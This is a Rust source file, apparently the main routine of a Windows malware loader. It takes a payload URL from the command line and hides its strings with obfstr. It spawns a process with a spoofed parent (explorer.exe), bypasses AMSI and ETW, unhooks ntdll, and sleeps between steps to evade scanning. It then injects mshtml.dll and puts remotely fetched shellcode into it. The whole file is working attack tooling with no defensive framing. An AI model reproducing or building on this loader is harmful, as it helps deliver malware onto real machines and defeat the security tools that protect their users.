//main entry of the loader to fetch payload from url and inject it into the memory of the target process
use crate::namoracore::novacore::*;
use obfstr::obfstr as m;

use std::ptr::null_mut;

pub fn novamain(args: Vec<String>) -> Result<(), anyhow::Error> {

    //parse the arguments
    let payload_url = match args.get(1) {
        Some(url) => url,
        None => {
            println!("{}", m!("[-] Usage: novamain <payload_url>"));
            return Err(anyhow::Error::msg("Invalid arguments"));
        }
    };

    // Step 1: Obtain the process ID of explorer.exe. 
    println!("{}", m!("[+] Getting Parent Process PID:"));
    let explorer_pid = match get_process_id_by_name("explorer.exe") {
        Ok(pid) => pid,
        Err(e) => {
            println!("{}", m!("[-] Error getting explorer.exe PID: {:?}"));
            return Err(anyhow::Error::msg(format!("{:?}", e)));
        }
    };

    let mut process = Process {
        process_name: String::new(),  // placeholder
        process_id: 0,                // placeholder
        file_path: m!("C:\\Windows\\System32\\mshtml.dll").to_string(),
        file_name: m!("mshtml.dll").to_string(),
        process_handle: 0,
        allocated_memory: 0,
        thread_handle: null_mut(),
    };

    //2. spawn and initialize the Process struct
    spawn_spoofed_ppid_process(explorer_pid as u64, &mut process);

    let time_to_sleep = Some(3000);
    let _ = shelter::fluctuate(true, time_to_sleep, None);

    match setup_bypass() {
        Ok(_) => {
            println!("{}", m!("[+] Bypassing AMSI and ETW:"));
        }
        Err(e) => {
            println!("{}", m!("[-] Error bypassing AMSI and ETW: {:?}"));
            return Err(anyhow::Error::msg(format!("{:?}", e)));
        }
    }

    unhook_ntdll(&mut process, false);
    let _ = shelter::fluctuate(true, time_to_sleep, None);
    unhook_ntdll(&mut process, true);
    let _ = shelter::fluctuate(true, time_to_sleep, None);

    //inject a legitimate dll
    inject_dll(&mut process);


    //inject shellcode into the legitimate dll

   let _ = inject_shellcode(&mut process, payload_url);

   



    Ok(())
}


